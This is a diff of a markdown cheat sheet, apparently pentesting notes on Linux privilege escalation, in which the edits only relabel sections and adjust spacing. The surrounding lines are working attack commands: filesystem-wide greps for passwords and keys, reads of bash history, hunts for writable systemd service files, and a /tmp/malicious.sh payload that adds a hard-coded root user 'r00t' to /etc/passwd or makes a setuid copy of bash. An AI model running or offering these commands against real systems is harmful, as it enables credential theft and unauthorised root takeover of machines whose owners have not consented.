@@ -139,23 +139,22 @@ ls -la /srv/html
 # /var/
 # interesting/hidden folder in /
 
-# In Path
+# A In Path
 grep --color=auto -rnw '/' -iIE "passw|passwd|password|pwd|secret|key" --color=always 2>/dev/null
 
-# From a path
+
+# B From a path
 cd to/path
 grep --color=auto -rnw -iIE "passw|passwd|password|pwd|secret|key" --color=always 2>/dev/null
 
 
-
-# in User files
+# C In User files
 cat ~/.bash_history
 cat ~/.bashrc
 strings file_name | grep -iE "password|pass|pwd|secret|key"
 
 
-
-# in Service Logs
+# D In Service Logs
 journalctl -u <service_name> | grep -E "password"
 
 # Check below for manual tips
@@ -186,35 +185,35 @@ cat /var/log/syslog
 ```
 ## Services
 ```shell
-# Search for unusual and writeable .service files
-#
+# A Search for unusual and writeable .service files
+
 # in standard paths ( use / for across system)
 find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system -type f -name "*.service" -perm [ -o+w | -ug+w ] 2>/dev/null
-#
+
 # user and non-standard dirs
 find /home /tmp /var/tmp ...
-#
+
 # show path
 find ... -exec ls -lh {} + 2>/dev/null | grep -E "bin|service"
 
 
-# List services using Systemctl
-#
+# B List services using Systemctl
+
 # standard
 systemctl list-units --type=service --state=running
 systemctl list-unit-files --type=service
-#
+
 # view service
 systemctl cat <service_name>
-#
+
 # view perms
 ls -l /etc/systemd/system/<service_name>.service
-#
+
 # View service environ
 systemctl show <service_name> | grep Environment
 
 
-# Search for Logs
+# C Search for Logs
 # standard
 journalctl -u <service_name>
 journalctl -u <service_name> | grep -E "error|failed|password|debug"
@@ -332,13 +331,15 @@ export PATH=/tmp:$PATH
 ```shell
 # 1 After cding into the writeable directory 
 
+
 # 2 Create the payload
 echo '#!/bin/bash' > /tmp/malicious.sh
 echo "" >> /tmp/malicious.sh
 
+
 # A add root user
 echo 'echo "r00t:ShuKpZV7v9akI:0:0:root:/root:/bin/bash" >> /etc/passwd' >> /tmp/malicious.sh
-# or
+
 # B root bash
 echo 'cp /bin/bash /tmp && chmod +s /tmp/bash' > /tmp/malicious.sh
 
